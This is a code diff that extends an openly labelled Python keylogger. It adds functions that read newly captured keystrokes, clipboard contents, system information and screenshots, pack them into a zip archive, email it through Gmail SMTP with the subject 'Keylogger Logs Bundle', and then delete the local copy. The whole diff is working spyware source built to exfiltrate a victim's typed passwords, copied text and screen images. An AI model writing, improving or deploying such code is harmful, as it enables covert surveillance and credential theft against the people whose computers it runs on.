@@ -1,7 +1,10 @@
 # Import necessary libraries
 import logging
 import os
+import time
 import platform
+import json
+import zipfile
 import smtplib
 import socket
 import threading
@@ -35,6 +38,11 @@ system_information = "data/systeminfo.txt"
 clipboard_information = "data/clipboard.txt"
 SCREENSHOT_DIR="data/screenshots"
 
+DATA_DIR = "data"
+SCREENSHOTS_DIR = os.path.join(DATA_DIR, "screenshots")
+STATE_FILE = os.path.join(DATA_DIR, "last_email_state.json")
+KEYLOG_EXTRA_BYTES = 2048
+
 # Retrieve email and password from environment variables
 email_address = os.getenv('email')
 password = os.getenv('pass')
@@ -53,29 +61,156 @@ def on_closing():
         root.destroy()
 
 
-# Function to send email with attachment
+def load_state():
+    default = {
+        "last_email_time": 0.0,
+        "offsets": {"key_log": 0, "clipboard": 0, "systeminfo": 0},
+        "sent_screenshots": []
+    }
+    if not os.path.exists(STATE_FILE):
+        os.makedirs(DATA_DIR, exist_ok=True)
+        with open(STATE_FILE, "w") as f:
+            json.dump(default, f)
+        return default
+    try:
+        with open(STATE_FILE, "r") as f:
+            return json.load(f)
+    except:
+        return default
+
+def save_state(state):
+    with open(STATE_FILE, "w") as f:
+        json.dump(state, f)
+
+def read_from_offset(path, offset, extra_bytes=0):
+    if not os.path.exists(path):
+        return "", 0
+    file_size = os.path.getsize(path)
+    start = max(0, offset - extra_bytes)
+    with open(path, "rb") as f:
+        f.seek(start)
+        data_bytes = f.read()
+    data = data_bytes.decode("utf-8", errors="replace")
+    return data, file_size
+
+def gather_screenshots(last_email_time, sent_list):
+    if not os.path.exists(SCREENSHOTS_DIR):
+        return []
+    files = []
+    for fname in sorted(os.listdir(SCREENSHOTS_DIR)):
+        fpath = os.path.join(SCREENSHOTS_DIR, fname)
+        if not os.path.isfile(fpath):
+            continue
+        try:
+            mtime = os.path.getmtime(fpath)
+        except:
+            continue
+        if mtime > last_email_time and fname not in sent_list:
+            files.append((fname, fpath, mtime))
+    files.sort(key=lambda x: x[2])
+    return files
+
+def make_zip(state):
+    os.makedirs(DATA_DIR, exist_ok=True)
+    timestamp = datetime.utcnow().strftime("%Y%m%dT%H%M%SZ")
+    zip_name = f"bundle_{timestamp}.zip"
+    zip_path = os.path.join(DATA_DIR, zip_name)
+
+    new_state_updates = {"offsets": {}, "sent_screenshots": []}
+
+    with zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED) as z:
+        # Key log
+        key_log_path = os.path.join(DATA_DIR, "key_log.txt")
+        key_data, new_offset = read_from_offset(key_log_path, state["offsets"].get("key_log", 0), KEYLOG_EXTRA_BYTES)
+        if key_data:
+            z.writestr("key_log_recent.txt", key_data)
+        new_state_updates["offsets"]["key_log"] = new_offset
+
+        # Clipboard recent data
+        clipboard_path = os.path.join(DATA_DIR, "clipboard.txt")
+        clip_data, new_clip_offset = read_from_offset(clipboard_path, state["offsets"].get("clipboard", 0))
+        if clip_data:
+            z.writestr("clipboard_recent.txt", clip_data)
+        new_state_updates["offsets"]["clipboard"] = new_clip_offset
+
+        # Clipboard full file (optional)
+        if os.path.exists(clipboard_path):
+            z.write(clipboard_path, arcname="clipboard_full.txt")
+
+
+
+        # System info
+        sysinfo_path = os.path.join(DATA_DIR, "systeminfo.txt")
+        sys_data, new_sys_offset = read_from_offset(sysinfo_path, state["offsets"].get("systeminfo", 0))
+        if sys_data:
+            z.writestr("systeminfo_recent.txt", sys_data)
+        new_state_updates["offsets"]["systeminfo"] = new_sys_offset
+
+        # Screenshots
+        last_email_time = state.get("last_email_time", 0.0)
+        screenshots = gather_screenshots(last_email_time, state.get("sent_screenshots", []))
+        for fname, fpath, mtime in screenshots:
+            arcname = os.path.join("screenshots", fname)
+            try:
+                z.write(fpath, arcname=arcname)
+                new_state_updates["sent_screenshots"].append(fname)
+            except:
+                continue
+
+    return zip_path, new_state_updates
+
 def send_email(filename, attachment, toaddr):
+    """
+    Modified to send bundled zip with all recent logs and screenshots.
+    filename: will be replaced by generated zip filename
+    attachment: ignored, auto-handled
+    """
+    # Load last state
+    state = load_state()
+
+    # Create zip with recent logs/screenshots
+    zip_path, updates = make_zip(state)
+    filename = os.path.basename(zip_path)
+
+    # Compose email
     fromaddr = email_address
     msg = MIMEMultipart()
     msg['From'] = fromaddr
     msg['To'] = toaddr
-    msg['Subject'] = "Log File"
-    body = "LOG file"
+    msg['Subject'] = "Keylogger Logs Bundle"
+    body = "Attached is the recent keylogger data bundle."
     msg.attach(MIMEText(body, 'plain'))
-    filename = filename
-    attachment = open(attachment, 'rb')
-    p = MIMEBase('application', 'octet-stream')
-    p.set_payload(attachment.read())
+
+    with open(zip_path, 'rb') as attachment_file:
+        p = MIMEBase('application', 'octet-stream')
+        p.set_payload(attachment_file.read())
     encoders.encode_base64(p)
-    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+    p.add_header('Content-Disposition', f"attachment; filename={filename}")
     msg.attach(p)
+
+    # Send email
     s = smtplib.SMTP('smtp.gmail.com', 587)
     s.starttls()
     s.login(fromaddr, password)
-    text = msg.as_string()
-    s.sendmail(fromaddr, toaddr, text)
+    s.sendmail(fromaddr, toaddr, msg.as_string())
     s.quit()
 
+    # Delete zip after sending
+    try:
+        os.remove(zip_path)
+    except:
+        pass
+
+    # Update state
+    new_state = state.copy()
+    new_state["last_email_time"] = time.time()
+    offsets = new_state.get("offsets", {})
+    offsets.update(updates.get("offsets", {}))
+    new_state["offsets"] = offsets
+    sent = set(new_state.get("sent_screenshots", []))
+    sent.update(updates.get("sent_screenshots", []))
+    new_state["sent_screenshots"] = list(sent)
+    save_state(new_state)
 
 # Function to gather system information
 def computer_information():
@@ -183,7 +318,7 @@ def start_logger():
         print(count)
         if stopFlag:
             break
-        if count % 30 == 0:
+        if count % 30 ==0 :
             copy_clipboard()
         if count == 0:
             screenshot()
